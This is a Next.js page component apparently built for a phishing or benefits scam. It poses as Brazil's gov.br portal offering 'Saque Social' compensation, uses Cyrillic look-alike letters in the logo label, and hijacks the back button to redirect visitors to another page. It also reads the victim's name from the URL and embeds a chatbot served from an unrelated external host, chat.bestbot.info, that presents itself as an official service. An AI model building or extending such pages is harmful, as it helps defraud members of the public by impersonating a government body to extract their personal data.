
"use client";

import React, { useState, useEffect, Suspense } from 'react';
import Head from 'next/head';
import Image from 'next/image';
import { useSearchParams, useRouter } from 'next/navigation';
import { MoreVertical, Cookie, LayoutGrid, User, Menu, Search } from 'lucide-react';
import '../chat-page.css'; // Styles specific to this chat page

function ChatPageContent() {
  const router = useRouter();
  const searchParams = useSearchParams();
  // const [isLoading, setIsLoading] = useState(true); // Removed: Suspense handles this
  const [headerUserName, setHeaderUserName] = useState('Usuário');

  useEffect(() => {
    const urlBackRedirect = '/back/index.html';
    const currentQuery = searchParams.toString();
    const trimmedUrlBackRedirect = urlBackRedirect.trim() + (urlBackRedirect.includes("?") ? '&' : '?') + currentQuery;

    // Ensure history modification only happens once or is idempotent
    if (window.history.state?.pageInitialized !== true) {
        history.pushState({ pageInitialized: true }, "", window.location.href);
        // Consider if a second pushState is truly needed here or if it's a remnant
        // history.pushState({ pageInitialized: true }, "", window.location.href);
    }
    
    const handlePopState = () => {
      setTimeout(() => {
        window.location.href = trimmedUrlBackRedirect;
      }, 1);
    };
    window.addEventListener('popstate', handlePopState);

    const nomeParam = searchParams.get('nome');
    if (nomeParam) {
      setHeaderUserName(nomeParam.split(' ')[0] || 'Usuário');
    }

    // Removed loadingTimer and setIsLoading(false) as Suspense handles initial load display
    // const loadingTimer = setTimeout(() => {
    //   setIsLoading(false);
    // }, 1200);

    return () => {
      window.removeEventListener('popstate', handlePopState);
      // clearTimeout(loadingTimer); // Timer removed
    };
  }, []); // Empty dependency array: runs once on mount

  useEffect(() => {
    const typebotElement = document.querySelector('typebot-standard');

    if (!typebotElement) {
        console.error('Typebot standard element not found in DOM for dynamic import init.');
        return;
    }
    
    // Check if Typebot is already initialized to prevent re-initialization
    if (typebotElement.shadowRoot?.querySelector('.typebot-container')) {
        console.log('Typebot already initialized or element not ready for re-init.');
        return;
    }

    import('@typebot.io/js') 
      .then(module => {
        const Typebot = module.default; 
        if (Typebot && typeof Typebot.initStandard === 'function') {
          console.log('Initializing Typebot from dynamically imported package...');
          Typebot.initStandard({
            typebot: "24lkdef", 
            apiHost: "https://chat.bestbot.info", 
          });
        } else {
          console.error('Typebot.initStandard not found on imported module:', module);
        }
      })
      .catch(err => {
        console.error('Error dynamically importing Typebot package:', err);
      });
  }, []); // Empty dependency array to run once on mount

  return (
    <>
      <Head>
        <title>Programa Saque Social - Atendimento</title>
      </Head>
      
      <div className="chat-page-body">
        {/* Removed internal isLoading check and loading screen div; Suspense handles this */}
        {/* {isLoading && (
          <div id="loading-screen"> ... </div>
        )} */}

        <header className="chat-page-header">
          <div className="logo">
            <svg width="148" height="45" viewBox="0 0 148 45" aria-label="GОV.ВR">
              <text x="0" y="33" fontSize="40" fontWeight="900" fontFamily="Arial, sans-serif">
                <tspan fill="#2864AE">g</tspan><tspan fill="#F7B731">o</tspan><tspan fill="#27AE60">v</tspan>
                <tspan fill="#2864AE">.b</tspan><tspan fill="#F7B731">r</tspan>
              </text>
            </svg>
          </div>
          <div className="icons">
            <button title="Opções"><MoreVertical /></button>
            <button title="Cookies"><Cookie /></button>
            <button title="Menu de Apps"><LayoutGrid /></button>
            <button className="user">
              <User />
              <span>{headerUserName}</span>
            </button>
          </div>
        </header>

        <nav className="chat-page-nav">
          <button>
            <Menu />
            <p>Benefício <span> &gt; </span> Indenização <span> &gt; </span> Atendimento</p>
          </button>
          <button title="Buscar"><Search /></button>
        </nav>

        <div className="typebot-container-wrapper">
            <div className="typebot-embed-container">
                 <typebot-standard style={{ width: '100%', height: '100%' }}></typebot-standard>
            </div>
        </div>
        
        <footer className="chat-page-footer">
          <Image 
            src="https://i.imgur.com/919uhHG.png"
            alt="Rodapé Logo" 
            width={150} 
            height={40} 
            className="footer-logo"
            data-ai-hint="company logo"
            priority={false}
          />
        </footer>
      </div>
    </>
  );
}

export default function ChatPage() {
  return (
    <Suspense fallback={
      <div id="loading-screen" style={{display: 'flex', alignItems: 'center', justifyContent: 'center', width: '100vw', height: '100vh', background: '#fff'}}> 
        <svg className="blink-logo" width="148" height="45" viewBox="0 0 148 45"> 
          <title>GОV.ВR</title> 
          <text x="0" y="33" fontSize="40" fontWeight="900" fontFamily="Arial, sans-serif"> 
            <tspan fill="#2864AE">g</tspan><tspan fill="#F7B731">o</tspan><tspan fill="#27AE60">v</tspan> 
            <tspan fill="#2864AE">.b</tspan><tspan fill="#F7B731">r</tspan> 
          </text> 
        </svg> 
      </div>
    }>
      <ChatPageContent />
    </Suspense>
  );
}
